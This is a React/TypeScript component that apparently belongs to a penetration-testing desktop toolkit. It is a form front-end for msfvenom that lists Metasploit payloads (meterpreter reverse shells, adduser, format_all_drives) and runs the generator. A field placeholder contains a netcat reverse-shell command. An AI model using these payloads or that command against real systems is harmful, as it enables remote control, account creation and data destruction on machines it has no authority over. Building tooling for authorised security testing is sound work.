import { Button, LoadingOverlay, NativeSelect, Stack, Switch, TextInput } from "@mantine/core";
import { useForm } from "@mantine/form";
import { useCallback, useState } from "react";
import { CommandHelper } from "../../utils/CommandHelper";
import ConsoleWrapper from "../ConsoleWrapper/ConsoleWrapper";
import { UserGuide } from "../UserGuide/UserGuide";
import { SaveOutputToTextFile_v2 } from "../SaveOutputToFile/SaveOutputToTextFile";

const title = "Payload Generator (msfvenom)";
const description_userguide =
    "Msfvenom is a payload generator and encoder that comes with the Metasploit Framework. " +
    "It allows you to create various types of payloads for exploitation. " +
    "Select the architecture, payload, and other options, then click Generate to create the payload.";

interface FormValuesType {
    lhost: string;
    lport: string;
    rhost: string;
    user: string;
    pass: string;
    text: string;
    url: string;
    cmd: string;
    dll: string;
    path: string;
    pe: string;
    pexec: string;
    file: string;
    mode: string;
    outputPath: string;
    custom: string;
}

const architectures = ["windows/x86", "windows/x64", "linux/x86", "Mac/x64", "Android ARM"];
const payloadOptions = [
    [
        "windows/meterpreter/reverse_tcp",
        "windows/shell_reverse_tcp",
        "windows/exec",
        "windows/adduser",
        "windows/messagebox",
        "windows/format_all_drives",
        "windows/loadlibrary",
        "windows/pingback_reverse_tcp",
        "windows/speak_pwned",
        "windows/upexec/bind_tcp",
    ],
    [
        "windows/x64/meterpreter/reverse_tcp",
        "windows/x64/shell_reverse_tcp",
        "windows/x64/exec",
        "windows/x64/adduser",
        "windows/x64/messagebox",
        "windows/x64/loadlibrary",
        "windows/x64/peinject/bind_tcp",
        "windows/x64/shell/bind_named_pipe",
    ],
    [
        "linux/x86/meterpreter/reverse_tcp",
        "linux/x86/shell_bind_tcp",
        "linux/x86/exec",
        "linux/x86/shell_find_tag",
        "linux/x86/adduser",
        "linux/x86/chmod",
        "linux/x86/read_file",
        "linux/x86/shell_find_port",
        "linux/x86/meterpreter/reverse_ipv6_tcp",
    ],
    [
        "osx/x64/meterpreter/reverse_https",
        "osx/x64/shell_bind_tcp",
        "osx/x64/exec",
        "osx/x64/say",
        "osx/x64/shell_find_tag",
        "osx/x64/dupandexecve/bind_tcp",
        "osx/x64/meterpreter/reverse_tcp",
    ],
    [
        "android/meterpreter/reverse_https",
        "android/meterpreter/reverse_tcp",
        "android/meterpreter_reverse_http",
        "android/meterpreter_reverse_https",
        "android/meterpreter_reverse_tcp",
        "android/shell/reverse_http",
        "android/shell/reverse_https",
        "android/shell/reverse_tcp",
    ],
];

const payloadFormats = ["exe", "elf", "raw", "psh", "asp", "aspx", "jsp", "war", "jar"];

const payloadRequiredVariables = [
    // windows x86 payload variables
    [
        ["LHOST", "LPORT"],
        ["LHOST", "LPORT"],
        ["CMD"],
        ["USER", "PASS"],
        ["TEXT"],
        [],
        ["DLL"],
        ["LHOST", "LPORT"],
        [],
        ["PEXEC"],
    ],
    //windows x64 payload variables
    [["LHOST", "LPORT"], ["LHOST", "LPORT"], ["CMD"], ["USER", "PASS"], ["TEXT"], ["DLL"], ["PE"], []],
    //linux x86 payload variables
    [
        ["LHOST", "LPORT"],
        ["LPORT"],
        ["CMD"],
        ["LHOST", "LPORT"],
        ["USER", "PASS"],
        ["FILE", "MODE"],
        ["PATH"],
        [],
        ["LHOST", "LPORT"],
    ],
    //MAC x64 payload variables
    [["LHOST", "LPORT"], ["LPORT"], ["CMD"], ["TEXT"], [], [], [], ["LHOST", "LPORT"]],
    //Android ARM payload variables
    [
        ["LHOST", "LPORT"],
        ["LHOST", "LPORT"],
        ["LHOST", "LPORT"],
        ["LHOST", "LPORT"],
        ["LHOST", "LPORT"],
        ["LHOST", "LPORT"],
        ["LHOST", "LPORT"],
        ["LHOST", "LPORT"],
    ],
];

const PayloadGenerator = () => {
    const [loading, setLoading] = useState(false);
    const [output, setOutput] = useState("");
    const [allowSave, setAllowSave] = useState(false);
    const [hasSaved, setHasSaved] = useState(false); 
    const [isCustomMode, setIsCustomMode] = useState(false);
    const [selectedArchitecture, setSelectedArchitecture] = useState("");
    const [selectedPayload, setSelectedPayload] = useState("");
    const [selectedFormat, setSelectedFormat] = useState("");
    const [payloadIndex, setPayloadIndex] = useState<number | null>(null);
    const [requiredVariables, setRequiredVariables] = useState<string[]>([]);
    const [pid, setPid] = useState("");

    const form = useForm<FormValuesType>({
        initialValues: {
            lhost: "",
            lport: "",
            rhost: "",
            user: "",
            pass: "",
            text: "",
            url: "",
            cmd: "",
            dll: "",
            path: "",
            pe: "",
            pexec: "",
            outputPath: "",
            file: "",
            mode: "",
            custom: "",
        },
    });

    // Uses the callback function of runCommandGetPidAndOutput to handle and save data
    // generated by the executing process into the output state variable.
    const handleProcessData = useCallback((data: string) => {
        setOutput((prevOutput) => prevOutput + "\n" + data); // Update output
    }, []);
    // Uses the onTermination callback function of runCommandGetPidAndOutput to handle
    // the termination of that process, resetting state variables, handling the output data,
    // and informing the user.
    const handleProcessTermination = useCallback(
        ({ code, signal }: { code: number; signal: number }) => {
            if (code === 0) {
                handleProcessData("\nProcess completed successfully.");
            } else if (signal === 15) {
                handleProcessData("\nProcess was manually terminated.");
            } else {
                handleProcessData(`\nProcess terminated with exit code: ${code} and signal code: ${signal}`);
            }
            // Clear the child process pid reference
            setPid("");
            // Cancel the Loading Overlay
            setLoading(false);
        },
        [handleProcessData]
    );
    // Sends a SIGTERM signal to gracefully terminate the process
    const handleCancel = () => {
        if (pid !== null) {
            const args = [`-15`, pid];
            CommandHelper.runCommand("kill", args);
        }
    };

    const handleSaveComplete = useCallback(() => { 
        setHasSaved(true);
        setAllowSave(false);
    }, []);

    const onSubmit = async () => {
        setLoading(true);
        setAllowSave(true); 
        const args = [];

        if (isCustomMode) {
            args.push(...form.values.custom.split(" "));
        } else {
            args.push("-p", selectedPayload);

            if (form.values.lhost) {
                args.push(`LHOST=${form.values.lhost}`);
            }

            if (form.values.lport) {
                args.push(`LPORT=${form.values.lport}`);
            }

            if (form.values.rhost) {
                args.push(`RHOST=${form.values.rhost}`);
            }

            if (form.values.user) {
                args.push(`USER=${form.values.user}`);
            }

            if (form.values.pass) {
                args.push(`PASS=${form.values.pass}`);
            }

            if (form.values.text) {
                args.push(`TEXT=${form.values.text}`);
            }

            if (form.values.url) {
                args.push(`URL=${form.values.url}`);
            }

            if (form.values.cmd) {
                args.push(`CMD=${form.values.cmd}`);
            }

            if (form.values.dll) {
                args.push(`DLL=${form.values.dll}`);
            }

            if (form.values.path) {
                args.push(`PATH=${form.values.path}`);
            }

            if (form.values.pexec) {
                args.push(`PEXEC=${form.values.pexec}`);
            }

            if (form.values.pe) {
                args.push(`PE=${form.values.pe}`);
            }

            if (form.values.file) {
                args.push(`FILE=${form.values.file}`);
            }

            if (form.values.mode) {
                args.push(`MODE=${form.values.mode}`);
            }

            args.push("-f", selectedFormat);
        }

        args.push("-o", form.values.outputPath);

        try {
            const result = await CommandHelper.runCommandGetPidAndOutput(
                "msfvenom",
                args,
                handleProcessData,
                handleProcessTermination
            );
            setPid(result.pid);
            setOutput(result.output);
        } catch (e: any) {
            setOutput(e.message);
        }
    };

    const clearOutput = useCallback(() => {
        setOutput("");
        setAllowSave(false);
        setHasSaved(false);
    }, []);

    const architectureIndex = architectures.indexOf(selectedArchitecture);

    return (
        <form onSubmit={form.onSubmit(onSubmit)}>
            <LoadingOverlay visible={loading} />
            {loading && (
                <div>
                    <Button variant="outline" color="red" style={{ zIndex: 1001 }} onClick={handleCancel}>
                        Cancel
                    </Button>
                </div>
            )}

            <Stack>
                {UserGuide(title, description_userguide)}

                {/* Add the "Custom" switch */}
                <Switch
                    label="Custom"
                    checked={isCustomMode}
                    onChange={() => {
                        setIsCustomMode(!isCustomMode);
                        setSelectedPayload(""); // Clear selected payload when switching modes
                    }}
                />

                {isCustomMode ? (
                    <TextInput
                        label="Custom Input"
                        placeholder="Enter your custom input, eg: -p windows/meterpreter/reverse_tcp -f exe LHOST= xxx.xxx.xxx.xxx LPORT= 1234"
                        {...form.getInputProps("custom")}
                        required
                    />
                ) : (
                    <>
                        <NativeSelect
                            value={selectedArchitecture}
                            onChange={(e) => {
                                setSelectedArchitecture(e.target.value);
                                setSelectedPayload("");
                            }}
                            title="Select Architecture"
                            data={architectures}
                            required
                            placeholder="Select Architecture"
                        />

                        <NativeSelect
                            value={selectedPayload}
                            onChange={(e) => {
                                setSelectedPayload(e.target.value);
                                const newIndex = payloadOptions[architectureIndex].indexOf(e.target.value);
                                setPayloadIndex(newIndex);
                                setRequiredVariables(payloadRequiredVariables[architectureIndex][newIndex] || []);
                            }}
                            title="Select Payload"
                            data={payloadOptions[architectureIndex] || []}
                            required
                            placeholder="Select Payload"
                        />

                        {/* Render other inputs based on requiredVariables */}
                        {requiredVariables.includes("LHOST") && (
                            <TextInput
                                label="LHOST"
                                placeholder="Enter LHOST eg. 192.168.1.1"
                                {...form.getInputProps("lhost")}
                            />
                        )}
                        {requiredVariables.includes("LPORT") && (
                            <TextInput
                                label="LPORT"
                                placeholder="Enter LPORT eg. 1335"
                                {...form.getInputProps("lport")}
                            />
                        )}
                        {requiredVariables.includes("RHOST") && (
                            <TextInput
                                label="RHOST"
                                placeholder="Enter RHOST eg. 192.168.2.1"
                                {...form.getInputProps("rhost")}
                            />
                        )}
                        {requiredVariables.includes("USER") && (
                            <TextInput label="USER" placeholder="Enter USERNAME" {...form.getInputProps("user")} />
                        )}
                        {requiredVariables.includes("PASS") && (
                            <TextInput label="PASS" placeholder="Enter PASSWORD" {...form.getInputProps("pass")} />
                        )}
                        {requiredVariables.includes("TEXT") && (
                            <TextInput
                                label="TEXT"
                                placeholder="Enter TEXT eg Hellow World"
                                {...form.getInputProps("text")}
                            />
                        )}
                        {requiredVariables.includes("URL") && (
                            <TextInput
                                label="URL"
                                placeholder="Enter URL eg. https://www.yoursite.com"
                                {...form.getInputProps("url")}
                            />
                        )}
                        {requiredVariables.includes("CMD") && (
                            <TextInput
                                label="CMD"
                                placeholder="Enter CMD eg. nc -c /bin/sh 192.168.2.1 1234"
                                {...form.getInputProps("cmd")}
                            />
                        )}
                        {requiredVariables.includes("DLL") && (
                            <TextInput label="DLL" placeholder="Enter DLL local path" {...form.getInputProps("dll")} />
                        )}
                        {requiredVariables.includes("PATH") && (
                            <TextInput label="PATH" placeholder="Enter path to file" {...form.getInputProps("path")} />
                        )}
                        {requiredVariables.includes("PE") && (
                            <TextInput
                                label="PE"
                                placeholder="Enter path to executable file for upload"
                                {...form.getInputProps("pe")}
                            />
                        )}
                        {requiredVariables.includes("PEXEC") && (
                            <TextInput
                                label="PEXEC"
                                placeholder="Enter path to executable file for upload"
                                {...form.getInputProps("pexec")}
                            />
                        )}
                        {requiredVariables.includes("FILE") && (
                            <TextInput
                                label="FILE"
                                placeholder="Enter path to file for chmod"
                                {...form.getInputProps("file")}
                            />
                        )}
                        {requiredVariables.includes("MODE") && (
                            <TextInput
                                label="MODE"
                                placeholder="Enter chmod value (in octal)"
                                {...form.getInputProps("mode")}
                            />
                        )}

                        <NativeSelect
                            value={selectedFormat}
                            onChange={(e) => setSelectedFormat(e.target.value)}
                            title="Select Format"
                            data={payloadFormats}
                            required
                            placeholder="Select Format"
                        />
                    </>
                )}
                <TextInput
                    label="Output Path"
                    placeholder="Enter output path/filename (no path defaults to src-tauri folder of DDT)"
                    {...form.getInputProps("outputPath")}
                />

                <Button type="submit">Generate</Button>
                {SaveOutputToTextFile_v2(output, allowSave, hasSaved, handleSaveComplete)}
                <ConsoleWrapper output={output} clearOutputCallback={clearOutput} /> 
            </Stack>
        </form>
    );
};

export default PayloadGenerator;
